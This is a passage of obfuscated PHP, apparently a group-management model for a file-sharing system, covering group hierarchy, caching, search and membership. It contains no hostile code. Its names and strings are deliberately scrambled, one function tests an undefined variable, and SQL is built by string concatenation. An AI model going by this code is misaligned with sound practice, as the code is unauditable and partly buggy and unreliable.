!1; } if ($½î ‡È[$ù€ÎíÖ[432]] != $è×õ¬ºƒ[$ù€ÎíÖ[432]]) { if ($Şâ¤”ËË[$ù€ÎíÖ[511]] !== $è×õ¬ºƒ[$ù€ÎíÖ[511]] && strpos($Şâ¤”ËË[$ù€ÎíÖ[511]], $è×õ¬ºƒ[$ù€ÎíÖ[511]] . $è×õ¬ºƒ[$ù€ÎíÖ[1859]] . $ù€ÎíÖ[50]) === 0) { return !1; } $½î ‡È[$ù€ÎíÖ[580]] = $Şâ¤”ËË[$ù€ÎíÖ[511]] . $½î ‡È[$ù€ÎíÖ[432]] . $ù€ÎíÖ[50]; $this->_changeChildLevel($è×õ¬ºƒ, $Şâ¤”ËË); $this->_clearCache($Şâ¤”ËË[$ù€ÎíÖ[1859]]); $this->_clearCache($è×õ¬ºƒ[$ù€ÎíÖ[432]]); } } if (isset($½î ‡È[$ù€ÎíÖ[32]])) { $this->setNamePinyin($òîÚ×·, $½î ‡È[$ù€ÎíÖ[32]]); } if (isset($½î ‡È[$ù€ÎíÖ[1945]])) { $this->metaSet($òîÚ×·, array($ù€ÎíÖ[1945] => $½î ‡È[$ù€ÎíÖ[1945]], $ù€ÎíÖ[1946] => $½î ‡È[$ù€ÎíÖ[1946]])); unset($½î ‡È[$ù€ÎíÖ[1945]]); unset($½î ‡È[$ù€ÎíÖ[1946]]); } $this->_clearChildrenCache($è×õ¬ºƒ); return $this->where(array($ù€ÎíÖ[1947] => $òîÚ×·))->save($½î ‡È); } private function _clearChildrenCache($•›’„üğ) { $¸…¥×Øˆ =& $_SERVER[ì™ı‰º¯]; $åÙûÛ€ = array($¸…¥×Øˆ[580] => array($¸…¥×Øˆ[540], $•›’„üğ[$¸…¥×Øˆ[511]] . $•›’„üğ[$¸…¥×Øˆ[1859]] . $¸…¥×Øˆ[541])); $ßÜù—åµ = $this->field($¸…¥×Øˆ[1859])->where($åÙûÛ€)->select(); foreach ($ßÜù—åµ as $ÙÊ»°Â) { $this->_clearCache($ÙÊ»°Â[$¸…¥×Øˆ[1859]]); } } private function _clearCache($èàª²®í) { $±Û­° =& $_SERVER[ì™ı‰º¯]; $this->cacheFunctionClear($±Û­°[1941], $èàª²®í); $this->cacheFunctionClear($±Û­°[1942], $èàª²®í); } private function _changeChildLevel($Åµ…ç•·, $Æ†ìÈˆ‰, $›Ö¯£Êú = false) { $éûÜÒ×’ =& $_SERVER[ì™ı‰º¯]; $˜Ë­·ğ‘ = $Åµ…ç•·[$éûÜÒ×’[511]] . $Åµ…ç•·[$éûÜÒ×’[1859]] . $éûÜÒ×’[50]; $Ï¨œÎø¿ = $Æ†ìÈˆ‰[$éûÜÒ×’[511]] . $Æ†ìÈˆ‰[$éûÜÒ×’[1859]] . $éûÜÒ×’[50] . $Åµ…ç•·[$éûÜÒ×’[1859]] . $éûÜÒ×’[50]; if ($›Ö¯£Êú) { $Ï¨œÎø¿ = $Æ†ìÈˆ‰[$éûÜÒ×’[511]] . $Æ†ìÈˆ‰[$éûÜÒ×’[1859]] . $éûÜÒ×’[50]; } $À–ìßÜ = array($éûÜÒ×’[580] => array($éûÜÒ×’[540], $Åµ…ç•·[$éûÜÒ×’[511]] . $Åµ…ç•·[$éûÜÒ×’[1859]] . $éûÜÒ×’[541])); $´’Ù÷Ğ = array($éûÜÒ×’[580] => array($éûÜÒ×’[589], "\x72\145\x70\x6c\141\143\145\x28\160\141\x72\145\156\164\x4c\x65\166\x65\154\x2c\x27{$˜Ë­·ğ‘}\47\54\x27{$Ï¨œÎø¿}\x27\x29")); $this->_clearChildrenCache($Åµ…ç•·); $this->where($À–ìßÜ)->data($´’Ù÷Ğ)->save(); } public function setNamePinyin($×öÅ„õ×, $Á€¿êˆ¾ = false) { $¬€áŞä´ =& $_SERVER[ì™ı‰º¯]; if (!$Á€¿êˆ¾) { $­à±åÉ = $this->getInfoSimple($×öÅ„õ×); $Á€¿êˆ¾ = $­à±åÉ[$¬€áŞä´[32]]; } if (!Input::check($Á€¿êˆ¾, $¬€áŞä´[583])) { $this->metaSet($×öÅ„õ×, $¬€áŞä´[465], null); $this->metaSet($×öÅ„õ×, $¬€áŞä´[464], null); return; } $í’×èÅ = array($¬€áŞä´[465] => str_replace($¬€áŞä´[53], $¬€áŞä´[12], Pinyin::get($Á€¿êˆ¾)), $¬€áŞä´[464] => Pinyin::get($Á€¿êˆ¾, $¬€áŞä´[584])); $this->metaSet($×öÅ„õ×, $í’×èÅ); } protected function groupStatus($âñœª§×, $ÍãÙÍ—˜) { $€×ãò½¢ =& $_SERVER[ì™ı‰º¯]; $î¹š®µ¯ = $this->getInfoSimple($âñœª§×); if (!$î¹š®µ¯) { return !1; } if ($ÍãÙÍ—˜ == $€×ãò½¢[88]) { $š©ïŒıÁ = $this->parentLevelArray($î¹š®µ¯[$€×ãò½¢[511]]); } else { $ëËò¾˜ò = array($€×ãò½¢[580] => array($€×ãò½¢[540], $î¹š®µ¯[$€×ãò½¢[511]] . $î¹š®µ¯[$€×ãò½¢[1859]] . $€×ãò½¢[541])); $š©ïŒıÁ = $this->where($ëËò¾˜ò)->field($€×ãò½¢[1859])->select(); $š©ïŒıÁ = array_to_keyvalue($š©ïŒıÁ, $€×ãò½¢[12], $€×ãò½¢[1859]); } $š©ïŒıÁ[] = $î¹š®µ¯[$€×ãò½¢[1859]]; $€èÊùà„ = array(); foreach ($š©ïŒıÁ as $âñœª§×) { $€èÊùà„[] = array($€×ãò½¢[1859] => $âñœª§×, $€×ãò½¢[94] => $€×ãò½¢[745], $€×ãò½¢[374] => $ÍãÙÍ—˜); $this->_clearCache($âñœª§×); } return Model($€×ãò½¢[1948])->addAll($€èÊùà„, array(), !0); } protected function groupRemove($Ï†·üëË, $ö¸Ô§å = false) { $ğ„İî» =& $_SERVER[ì™ı‰º¯]; $ŞöÄûüŞ = array($ğ„İî»[1859] => $Ï†·üëË); $±Ìºòêë = $this->where($ŞöÄûüŞ)->find(); if (!$±Ìºòêë || $±Ìºòêë[$ğ„İî»[432]] == 0) { return !1; } if (!$ö¸Ô§å) { $Ô•ş«û = $this->getInfoSimple($±Ìºòêë[$ğ„İî»[432]]); $this->_changeChildLevel($±Ìºòêë, $Ô•ş«û, !0); $this->where(array($ğ„İî»[432] => $Ï†·üëË))->save(array($ğ„İî»[432] => $±Ìºòêë[$ğ„İî»[432]])); $this->_clearCache($Ô•ş«û[$ğ„İî»[1859]]); } Model($ğ„İî»[1948])->where($ŞöÄûüŞ)->delete(); Model($ğ„İî»[1949])->where($ŞöÄûüŞ)->delete(); Model($ğ„İî»[821])->groupRootRemove($Ï†·üëË); $this->_clearCache($±Ìºòêë[$ğ„İî»[432]]); return $this->where($ŞöÄûüŞ)->delete(); } protected function groupSort($ßË·§æë) { $óª¹øğ´ =& $_SERVER[ì™ı‰º¯]; $¬ÂÛ›­¹ = array(); foreach ($ßË·§æë as $­´Ğ§£ä => $¨ã—ã‹¯) { $¬ÂÛ›­¹[] = array($óª¹øğ´[1859], $¨ã—ã‹¯, $óª¹øğ´[1883], $­´Ğ§£ä + 1); } $this->saveAll($¬ÂÛ›­¹); } public function listData() { $ë¬øÇÃ¾ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ë¬øÇÃ¾[$_SERVER[ì™ı‰º¯][369]]); return $ë¬øÇÃ¾; } private function _makeOrder($Á—îı‚ = '') { $«òÈÁ“ =& $_SERVER[ì™ı‰º¯]; $³À…Ç£¼ = array($«òÈÁ“[1859], $«òÈÁ“[32], $«òÈÁ“[1848], $«òÈÁ“[201]); $ÅÖÆÁşÈ = array($«òÈÁ“[450] => $«òÈÁ“[451], $«òÈÁ“[452] => $«òÈÁ“[453]); $ñ½øÎüË = Input::get($«òÈÁ“[457], $«òÈÁ“[7], $«òÈÁ“[1863], $³À…Ç£¼); $ƒ‰éÕüŒ = Input::get($«òÈÁ“[458], $«òÈÁ“[7], $«òÈÁ“[1950], array($«òÈÁ“[1950], $«òÈÁ“[452])); $ƒ‰éÕüŒ = $ÅÖÆÁşÈ[$ƒ‰éÕüŒ]; $Á—îı‚ = $Á—îı‚ . "{$ñ½øÎüË}\40{$ƒ‰éÕüŒ}\x2c\40\147\x72\157\x75\160\x49\104\x20\x61\x73\x63"; return $this->order($Á—îı‚); } public function listChild($•„­óØã) { $áéŞÒœ =& $_SERVER[ì™ı‰º¯]; $ÏµÆ·ò = $this->where(array($áéŞÒœ[432] => $•„­óØã))->_makeOrder()->selectPage(200); $this->_listDataApply($ÏµÆ·ò[$áéŞÒœ[369]]); return $ÏµÆ·ò; } public function listChildIds($õÊº“êÓ) { $°ÁÑò¸© =& $_SERVER[ì™ı‰º¯]; if (is_string($·³ÀÒ×ş)) { $õÊº“êÓ = explode($°ÁÑò¸©[50], $õÊº“êÓ); } $ã¬¶üğÓ = $this->where(array($°ÁÑò¸©[1859] => array($°ÁÑò¸©[7], $õÊº“êÓ)))->field($°ÁÑò¸©[1951])->select(); if (!$ã¬¶üğÓ) { return !1; } $şäÓ¹Áı = array(); foreach ($ã¬¶üğÓ as $ï…Ò¨†›) { $şäÓ¹Áı[] = "\x73\145\x6c\145\x63\x74\40\x67\162\157\165\160\x49\x44\x20\x66\162\x6f\x6d\x20\x60\x67\x72\157\x75\160\140\x20\167\x68\x65\x72\x65\40\x70\141\x72\145\x6e\x74\114\x65\x76\x65\x6c\40\154\x69\153\x65\x20\x27{$ï…Ò¨†›[$°ÁÑò¸©[511]]}{$ï…Ò¨†›[$°ÁÑò¸©[1859]]}\54\45\x27"; } $şäÓ¹Áı = implode($°ÁÑò¸©[1952], $şäÓ¹Áı); $ã¬¶üğÓ = $this->query($şäÓ¹Áı); if (!$ã¬¶üğÓ) { return array(); } $õÊº“êÓ = array_to_keyvalue($ã¬¶üğÓ, $°ÁÑò¸©[12], $°ÁÑò¸©[1859]); return array_unique($õÊº“êÓ); } public function listByID($ËÖõøŒŞ) { $òèíáÈï =& $_SERVER[ì™ı‰º¯]; if (!$ËÖõøŒŞ) { return array(); } $¹ÒÙá¸Ş = array($òèíáÈï[1859] => array($òèíáÈï[7], $ËÖõøŒŞ)); $ùó¤Ã÷é = $this->where($¹ÒÙá¸Ş)->select(); $ùó¤Ã÷é = array_sort_keep($ùó¤Ã÷é, $òèíáÈï[1859], $ËÖõøŒŞ); $this->_listDataApply($ùó¤Ã÷é); return $ùó¤Ã÷é; } public function listSearch($Ô«ğä®ë) { $ÚúˆƒÇ =& $_SERVER[ì™ı‰º¯]; $×¨ü·© = $Ô«ğä®ë[$ÚúˆƒÇ[1953]]; $È‚İï¤± = isset($Ô«ğä®ë[$ÚúˆƒÇ[1954]]) ? $Ô«ğä®ë[$ÚúˆƒÇ[1954]] : !1; if (!trim($×¨ü·©)) { return !1; } $×¨ü·© = str_replace($ÚúˆƒÇ[1955], $ÚúˆƒÇ[1956], $×¨ü·©); $ĞŠ£•¬µ = array($ÚúˆƒÇ[1859] => array($ÚúˆƒÇ[383], "{$×¨ü·©}\45"), $ÚúˆƒÇ[32] => array($ÚúˆƒÇ[383], "\x25{$×¨ü·©}\x25"), $ÚúˆƒÇ[999] => $ÚúˆƒÇ[1957]); if ($È‚İï¤±) { $¨®ÓÃ¼ = $this->getInfoSimple($È‚İï¤±); $ªõø®î = $¨®ÓÃ¼[$ÚúˆƒÇ[511]] . $È‚İï¤± . $ÚúˆƒÇ[541]; $ĞŠ£•¬µ = array($ĞŠ£•¬µ, array($ÚúˆƒÇ[511] => array($ÚúˆƒÇ[383], $ªõø®î))); } $ĞŠ£•¬µ = $this->parseWhereLike($ĞŠ£•¬µ); $„”ªÄŒ‡ = $this->_makeOrder()->where($ĞŠ£•¬µ)->selectPage(20); $„”ªÄŒ‡ = $„”ªÄŒ‡ ? $„”ªÄŒ‡ : array($ÚúˆƒÇ[369] => array(), $ÚúˆƒÇ[366] => array()); if (!$„”ªÄŒ‡ || count($„”ªÄŒ‡[$ÚúˆƒÇ[369]]) < 5 && Input::check($×¨ü·©, $ÚúˆƒÇ[318])) { $§‡…ˆƒğ = $this->groupChildrenAll($È‚İï¤±); $’Îû¨—‚ = $this->_searchFromMeta($ÚúˆƒÇ[464], $×¨ü·©, 10, $§‡…ˆƒğ); $Éï±­• = $this->_searchFromMeta($ÚúˆƒÇ[465], $×¨ü·©, 10, $§‡…ˆƒğ); $‚ù¯øË = array_merge($’Îû¨—‚, $Éï±­•, $„”ªÄŒ‡[$ÚúˆƒÇ[369]]); $„”ªÄŒ‡[$ÚúˆƒÇ[369]] = array_unique_by_key($‚ù¯øË, $ÚúˆƒÇ[1859]); $„”ªÄŒ‡[$ÚúˆƒÇ[366]][$ÚúˆƒÇ[367]] = count($„”ªÄŒ‡[$ÚúˆƒÇ[369]]); $„”ªÄŒ‡[$ÚúˆƒÇ[366]][$ÚúˆƒÇ[368]] = ceil($„”ªÄŒ‡[$ÚúˆƒÇ[366]][$ÚúˆƒÇ[367]] / $„”ªÄŒ‡[$ÚúˆƒÇ[366]][$ÚúˆƒÇ[363]]); } $this->_listDataApply($„”ªÄŒ‡[$ÚúˆƒÇ[369]]); return $„”ªÄŒ‡; } protected function groupChildrenAll($£ŒÇøÎ‰) { $ëºä¼ˆã =& $_SERVER[ì™ı‰º¯]; if (!$£ŒÇøÎ‰) { return !1; } if (is_string($£ŒÇøÎ‰)) { $£ŒÇøÎ‰ = array($£ŒÇøÎ‰); } $¾ËË¶Æç = $£ŒÇøÎ‰; foreach ($£ŒÇøÎ‰ as $¢€¢ëâş) { $”¯Ùöè« = $this->getInfoSimple($¢€¢ëâş); $ŒèªÎ‚ = array($ëºä¼ˆã[511] => array($ëºä¼ˆã[383], $”¯Ùöè«[$ëºä¼ˆã[511]] . $¢€¢ëâş . $ëºä¼ˆã[541])); $îë†²Š§ = $this->field($ëºä¼ˆã[1859])->where($ŒèªÎ‚)->select(); $¾ËË¶Æç = array_merge($¾ËË¶Æç, array_to_keyvalue($îë†²Š§, $ëºä¼ˆã[12], $ëºä¼ˆã[1859])); } return array_unique($¾ËË¶Æç); } private function _searchFromMeta($Á²·ş¿, $Á´°ºïë, $Ö”öÅ“À, $×õÖİµô) { $æµŸç› =& $_SERVER[ì™ı‰º¯]; $Á´°ºïë = strtolower($Á´°ºïë); $¨½ÈŒàí = array($æµŸç›[94] => $Á²·ş¿, $æµŸç›[374] => array($æµŸç›[383], "\x25{$Á´°ºïë}\45")); $¨½ÈŒàí = $this->parseWhereLike($¨½ÈŒàí); if ($×õÖİµô) { $¨½ÈŒàí[$æµŸç›[1859]] = array($æµŸç›[7], $×õÖİµô); } $àÄûÅ…¨ = Model($æµŸç›[1958])->where($¨½ÈŒàí)->limit($Ö”öÅ“À)->select(); if (!$àÄûÅ…¨) { return array(); } $àÄûÅ…¨ = array_to_keyvalue($àÄûÅ…¨, $æµŸç›[12], $æµŸç›[1859]); $ ©ƒÃóÔ = $this->where(array($æµŸç›[1947] => array($æµŸç›[7], $àÄûÅ…¨)))->select(); if (!$ ©ƒÃóÔ) { return array(); } return $ ©ƒÃóÔ; } protected function _listDataApplyItem($ìƒÙ˜İÑ) { $âŞÕê²Ğ = array($ìƒÙ˜İÑ); $this->_listDataApply($âŞÕê²Ğ); return $âŞÕê²Ğ[0]; } protected function _listDataApply(&$‘…Ğ—ßõ) { $ğ÷Ñóêï =& $_SERVER[ì™ı‰º¯]; if (!$‘…Ğ—ßõ) { return; } $ì¬¯½ˆ = array_to_keyvalue($‘…Ğ—ßõ, $ğ÷Ñóêï[12], $ğ÷Ñóêï[1859]); $this->_listAppendChildren($‘…Ğ—ßõ); $this->_listAppendChildrenMember($‘…Ğ—ßõ); $this->_listAppendMeta($‘…Ğ—ßõ, $ì¬¯½ˆ); $this->_listAppendParent($‘…Ğ—ßõ); $this->_listAppendSourceRoot($‘…Ğ—ßõ, $ì¬¯½ˆ); } private function _listAppendChildren(&$Ç˜÷Ï¯) { $³ºÈû®º =& $_SERVER[ì™ı‰º¯]; $ĞÄ÷¿›Ğ = array_to_keyvalue($Ç˜÷Ï¯, $³ºÈû®º[12], $³ºÈû®º[1859]); $‘Ÿ­ùÂˆ = array($³ºÈû®º[432] => array($³ºÈû®º[7], $ĞÄ÷¿›Ğ)); $°™‘Š¯ = array($³ºÈû®º[432], $³ºÈû®º[1959] => $³ºÈû®º[491]); $š…ÎŠ– = $this->field($°™‘Š¯)->where($‘Ÿ­ùÂˆ)->group($³ºÈû®º[432])->select(); $ş¬Öåò = array_to_keyvalue($š…ÎŠ–, $³ºÈû®º[432], $³ºÈû®º[491]); foreach ($Ç˜÷Ï¯ as &$¡ÙÏØÎ¾) { $ê£î®Å = $¡ÙÏØÎ¾[$³ºÈû®º[1859]]; $¡ÙÏØÎ¾[$³ºÈû®º[1960]] = isset($ş¬Öåò[$ê£î®Å]) ? intval($ş¬Öåò[$ê£î®Å]) : !1; } unset($¡ÙÏØÎ¾); } private function _listAppendChildrenMember(&$ÒşáÚœ) { $¿åŠÙ¡ï =& $_SERVER[ì™ı‰º¯]; $…³„‚ßÍ = array_to_keyvalue($ÒşáÚœ, $¿åŠÙ¡ï[12], $¿åŠÙ¡ï[1859]); $ìåûê’« = array($¿åŠÙ¡ï[1859] => array($¿åŠÙ¡ï[7], $…³„‚ßÍ)); $¼£’ù€ı = array($¿åŠÙ¡ï[1859], $¿åŠÙ¡ï[1959] => $¿åŠÙ¡ï[491]); $ŞØš«œ³ = Model($¿åŠÙ¡ï[1949])->field($¼£’ù€ı)->where($ìåûê’«)->group($¿åŠÙ¡ï[1859])->select(); $†Ü—ìÊá = array_to_keyvalue($ŞØš«œ³, $¿åŠÙ¡ï[1859], $¿åŠÙ¡ï[491]); foreach ($ÒşáÚœ as &$ô¥´Ï•ï) { $—ÙıÔ…Î = $ô¥´Ï•ï[$¿åŠÙ¡ï[1859]]; $ô¥´Ï•ï[$¿åŠÙ¡ï[1961]] = isset($†Ü—ìÊá[$—ÙıÔ…Î]) ? intval($†Ü—ìÊá[$—ÙıÔ…Î]) : !1; } unset($ô¥´Ï•ï); } private function _listAppendMeta(&$¢ˆæ¸‹Õ, $úÃªÆ) { $äÕù‹… =& $_SERVER[ì™ı‰º¯]; $éËîßşÂ = array($äÕù‹…[1859] => array($äÕù‹…[7], $úÃªÆ)); $èÎâÂÔ… = Model($äÕù‹…[1948])->where($éËîßşÂ)->select(); $èÎâÂÔ… = array_to_keyvalue_group($èÎâÂÔ…, $äÕù‹…[1859]); foreach ($èÎâÂÔ… as &$”¥÷¤ˆ) { $”¥÷¤ˆ = array_to_keyvalue($”¥÷¤ˆ, $äÕù‹…[94], $äÕù‹…[374]); } unset($”¥÷¤ˆ); foreach ($¢ˆæ¸‹Õ as &$ú¹¿µ£‚) { $ú¹¿µ£‚[$äÕù‹…[466]] = array(); if (isset($èÎâÂÔ…[$ú¹¿µ£‚[$äÕù‹…[1859]]])) { $ú¹¿µ£‚[$äÕù‹…[466]] = $èÎâÂÔ…[$ú¹¿µ£‚[$äÕù‹…[1859]]]; } } unset($ú¹¿µ£‚); } protected function parentLevelArray($éÛùÁÕß) { $–ƒûÂ« =& $_SERVER[ì™ı‰º¯]; $éÛùÁÕß = explode($–ƒûÂ«[50], trim($éÛùÁÕß, $–ƒûÂ«[50])); $éÛùÁÕß = array_remove_value($éÛùÁÕß, $–ƒûÂ«[198]); return $éÛùÁÕß; } protected function parentInGroup($ö—áØµ¦, $“¶”«¿‘) { $û•„Ø£¹ =& $_SERVER[ì™ı‰º¯]; $Ü¾ªş”Ÿ = $this->getInfoSimple($ö—áØµ¦); if (!$Ü¾ªş”Ÿ) { return !0; } $ôı—ˆ«ù = $this->parentLevelArray($Ü¾ªş”Ÿ[$û•„Ø£¹[511]]); $ôı—ˆ«ù[] = $ö—áØµ¦; foreach ($ôı—ˆ«ù as $ö—áØµ¦) { if (in_array($ö—áØµ¦ . $û•„Ø£¹[12], $“¶”«¿‘)) { return !0; } } return !1; } private function _listAppendParent(&$£ƒ²ŒÎï) { $ö™Âƒ¾Ã =& $_SERVER[ì™ı‰º¯]; $îéø×èŞ = array(); foreach ($£ƒ²ŒÎï as &$ğêÑÃÃ) { $îéø×èŞ[$ğêÑÃÃ[$ö™Âƒ¾Ã[1859]]] = $ğêÑÃÃ[$ö™Âƒ¾Ã[32]]; $Î¨úˆïË = $this->parentLevelArray($ğêÑÃÃ[$ö™Âƒ¾Ã[511]]); foreach ($Î¨úˆïË as $Œ‹ìˆ†¸) { if (!isset($îéø×èŞ[$Œ‹ìˆ†¸])) { $îéø×èŞ[$Œ‹ìˆ†¸] = 0; } } } unset($ğêÑÃÃ); foreach ($îéø×èŞ as $¢í‡éØ => $»ÒÈ¸¦Š) { if ($»ÒÈ¸¦Š) { continue; } $¯±®ô« = $this->getInfoSimple($¢í‡éØ); $îéø×èŞ[$¢í‡éØ] = $¯±®ô«[$ö™Âƒ¾Ã[32]]; } $Ø‚×Ñïß = $GLOBALS[$ö™Âƒ¾Ã[6]][$ö™Âƒ¾Ã[89]][$ö™Âƒ¾Ã[1962]]; if ($GLOBALS[$ö™Âƒ¾Ã[494]] == $ö™Âƒ¾Ã[88]) { $Ø‚×Ñïß = !1; } foreach ($£ƒ²ŒÎï as &$ğêÑÃÃ) { $Î¨úˆïË = $this->parentLevelArray($ğêÑÃÃ[$ö™Âƒ¾Ã[511]]); $Ë±éÜ±ñ = $ö™Âƒ¾Ã[12]; foreach ($Î¨úˆïË as $¢í‡éØ => $Œ‹ìˆ†¸) { if ($Ø‚×Ñïß && $¢í‡éØ == 0) { continue; } $Ë±éÜ±ñ .= $îéø×èŞ[$Œ‹ìˆ†¸] . $ö™Âƒ¾Ã[8]; } if ($Î¨úˆïË) { $Ë±éÜ±ñ .= $ğêÑÃÃ[$ö™Âƒ¾Ã[32]]; } $ğêÑÃÃ[$ö™Âƒ¾Ã[516]] = str_replace($ö™Âƒ¾Ã[519], $ö™Âƒ¾Ã[8], $Ë±éÜ±ñ); } unset($ğêÑÃÃ); } private function _listAppendSourceRoot(&$·¿¬œÇ, $–ò§Ò¬») { $Îµ©¯¾İ =& $_SERVER[ì™ı‰º¯]; $Ú×¤ä‘— = Model($Îµ©¯¾İ[821])->listSourceRoot(SourceModel::TYPE_GROUP, $–ò§Ò¬»); $Ú×¤ä‘— = array_to_keyvalue($Ú×¤ä‘—, $Îµ©¯¾İ[496]); $Ú×¤ä‘— = array_remove_key($Ú×¤ä‘—, $Îµ©¯¾İ[496]); foreach ($·¿¬œÇ as &$úºú‘À) { $úºú‘À[$Îµ©¯¾İ[87]] = $Ú×¤ä‘—[$úºú‘À[$Îµ©¯¾İ[1859]]] ? $Ú×¤ä‘—[$úºú‘À[$Îµ©¯¾İ[1859]]] : array(); } unset($úºú‘À); } protected function groupMerge($à˜äŸ×¹) { $à˜äŸ×¹ = array_values(array_unique($à˜äŸ×¹)); $Àõ¤‰­² = array(); for ($¿åİ¼Å = 0; $¿åİ¼Å < count($à˜äŸ×¹); $¿åİ¼Å++) { $“ÁèìÔ° = !1; for ($¥¢şÙõ¨ = 0; $¥¢şÙõ¨ < count($à˜äŸ×¹); $¥¢şÙõ¨++) { if ($¿åİ¼Å == $¥¢şÙõ¨) { continue; } if ($this->isParentOf($à˜äŸ×¹[$¥¢şÙõ¨], $à˜äŸ×¹[$¿åİ¼Å])) { $“ÁèìÔ° = !0; break; } } if (!$“ÁèìÔ°) { $Àõ¤‰­²[] = $à˜äŸ×¹[$¿åİ¼Å]; } } return $Àõ¤‰­²; } protected function isParentOf($Á¸ŞŸìÓ, $”¤¨ğÒ­) { $¿à¦Ú˜› =& $_SERVER[ì™ı‰º¯]; if (!$Á¸ŞŸìÓ || !$”¤¨ğÒ­ || $Á¸ŞŸìÓ == $”¤¨ğÒ­) { return !1; } $çàÌ´÷¥ = $this->getInfoSimple($Á¸ŞŸìÓ); $Ñãõìœõ = $this->getInfoSimple($”¤¨ğÒ­); $©è°û­á = $çàÌ´÷¥[$¿à¦Ú˜›[511]] . $Á¸ŞŸìÓ . $¿à¦Ú˜›[50]; if (substr($Ñãõìœõ[$¿à¦Ú˜›[511]], 0, strlen($©è°û­á)) == $©è°û­á) { return !0; } return !1; } public function groupShowRoot($„™Èóä, $Î¬úş†† = false) { $†œ·ê¹ =& $_SERVER[ì™ı‰º¯]; $’èà†ç„ = $this->getInfo($„™Èóä); if (!$’èà†ç„) { return array(); } $×»ã“Şì = $this->parentLevelArray($’èà†ç„[$†œ·ê¹[511]]); $’ì¢¨Ú‚ = array($„™Èóä); if (count($×»ã“Şì) == 0) { return $’ì¢¨Ú‚; } if ($Î¬úş†† && count($×»ã“Şì) == 1) { return $’ì¢¨Ú‚; } if (!$’èà†ç„[$†œ·ê¹[466]] || !isset($’èà†ç„[$†œ·ê¹[466]][$†œ·ê¹[1945]]) || $’èà†ç„[$†œ·ê¹[466]][$†œ·ê¹[1945]] == $†œ·ê¹[1914]) { return $this->groupShowRoot($×»ã“Şì[count($×»ã“Şì) - 1], $Î¬úş††); } if ($’èà†ç„[$†œ·ê¹[466]][$†œ·ê¹[1945]] == $†œ·ê¹[357]) { $Ú‹…÷ºÎ = explode($†œ·ê¹[50], $’èà†ç„[$†œ·ê¹[466]][$†œ·ê¹[1946]]); if ($Ú‹…÷ºÎ) { $’ì¢¨Ú‚ = array_merge($’ì¢¨Ú‚, $Ú‹…÷ºÎ); } } return $’ì¢¨Ú‚; } protected function resetParentLevel() { $¤Û«¬ê² =& $_SERVER[ì™ı‰º¯]; $ôÎÎ½¥ä = $¤Û«¬ê²[1859]; $Äçªë¦ğ = $this->select(); $Äçªë¦ğ = array_to_keyvalue($Äçªë¦ğ, $ôÎÎ½¥ä); foreach ($Äçªë¦ğ as $ØË”™È‚) { $ë©É–ó  = $ØË”™È‚; $¢‚ÇÛä© = array(); while ($ë©É–ó [$¤Û«¬ê²[432]] != 0) { $¢‚ÇÛä©[] = $ë©É–ó [$¤Û«¬ê²[432]]; $ë©É–ó  = $Äçªë¦ğ[$ë©É–ó [$¤Û«¬ê²[432]]]; } $¢‚ÇÛä©[] = 0; $¢‚ÇÛä© = $¤Û«¬ê²[50] . implode($¤Û«¬ê²[50], array_reverse($¢‚ÇÛä©)) . $¤Û«¬ê²[50]; $this->setNamePinyin($ØË”™È‚[$ôÎÎ½¥ä], $ØË”™È‚[$¤Û«¬ê²[32]]); $this->where(array($ôÎÎ½¥ä => $ØË”™È‚[$ôÎÎ½¥ä]))->save(array($¤Û«¬ê²[580] => $¢‚ÇÛä©)); } return $Äçªë¦ğ; } public function groupNameAuto($–ºÆÃ, $öëÎÏ ¼) { $öÎ­†Ú =& $_SERVER[ì™ı‰º¯]; $¹İú¿´Œ = $this->where(array($öÎ­†Ú[401] => $–ºÆÃ))->getField($öÎ­†Ú[32], !0); if (!$¹İú¿´Œ || !in_array($öëÎÏ ¼, $¹İú¿´Œ)) { return $öëÎÏ ¼; } for ($É˜Ÿ´ñŒ = 1; $É˜Ÿ´ñŒ <= count($¹İú¿´Œ) + 1; $É˜Ÿ´ñŒ++) { $ó‹å”öÃ = $öëÎÏ ¼ . "\x28{$É˜Ÿ´ñŒ}\x29"; if (!in_array($ó‹å”öÃ, $¹İú¿´Œ)) { return $ó‹å”öÃ; } } } public function groupSwitch($…ÔÀ¸ÃË, $‚„—Ñ’ó) { $öç‹¿àÃ =& $_SERVER[ì™ı‰º¯]; $£Á’ß€í = array($öç‹¿àÃ[1859] => array($öç‹¿àÃ[7], array($…ÔÀ¸ÃË, $‚„—Ñ’ó))); $…»ÊÏ° = $this->where($£Á’ß€í)->select(); $…»ÊÏ° = array_to_keyvalue($…»ÊÏ°, $öç‹¿àÃ[1859]); if (!isset($…»ÊÏ°[$…ÔÀ¸ÃË]) || !isset($…»ÊÏ°[$‚„—Ñ’ó]) || $…»ÊÏ°[$…ÔÀ¸ÃË][$öç‹¿àÃ[432]] == 0) { return !1; } $£Á’ß€í = array($öç‹¿àÃ[1859] => $…ÔÀ¸ÃË); $ùàÜï¦ú = Model($öç‹¿àÃ[1949])->where($£Á’ß€í)->select(); if (!$ùàÜï¦ú) { $ùàÜï¦ú = array(); } foreach ($ùàÜï¦ú as $•»¶—œ) { $ØÑÚ¸¼î = $•»¶—œ[$öç‹¿àÃ[1670]]; $£Á’ß€í = array($öç‹¿àÃ[1670] => $ØÑÚ¸¼î, $öç‹¿àÃ[1859] => $‚„—Ñ’ó); $¡’ã½‡´ = Model($öç‹¿àÃ[1949])->where($£Á’ß€í)->find(); if (!$¡’ã½‡´) { $ˆ‚î£¡Ó = array($‚„—Ñ’ó => $•»¶—œ[$öç‹¿àÃ[1963]]); Model($öç‹¿àÃ[525])->userGroupAdd($ØÑÚ¸¼î, $ˆ‚î£¡Ó); } Model($öç‹¿àÃ[525])->userGroupRemove($ØÑÚ¸¼î, $…ÔÀ¸ÃË); } $£Á’ß€í = array($öç‹¿àÃ[411] => 2, $öç‹¿àÃ[432] => 0, $öç‹¿àÃ[410] => 1, $öç‹¿àÃ[496] => array($öç‹¿àÃ[7], array($…ÔÀ¸ÃË, $‚„—Ñ’ó))); $„ëòª­Œ = Model($öç‹¿àÃ[821])->where($£Á’ß€í)->field($öç‹¿àÃ[1964])->select(); $„ëòª­Œ = array_to_keyvalue($„ëòª­Œ, $öç‹¿àÃ[496], $öç‹¿àÃ[402]); $÷áºˆÅ = !empty($„ëòª­Œ[$…ÔÀ¸ÃË]) ? $„ëòª­Œ[$…ÔÀ¸ÃË] : !1; if ($÷áºˆÅ) { if (!$„ëòª­Œ[$‚„—Ñ’ó]) { $„ëòª­Œ[$‚„—Ñ’ó] = Model($öç‹¿àÃ[821])->groupRootAdd($‚„—Ñ’ó); } $«Ô¥ê¡ = $„ëòª­Œ[$‚„—Ñ’ó]; 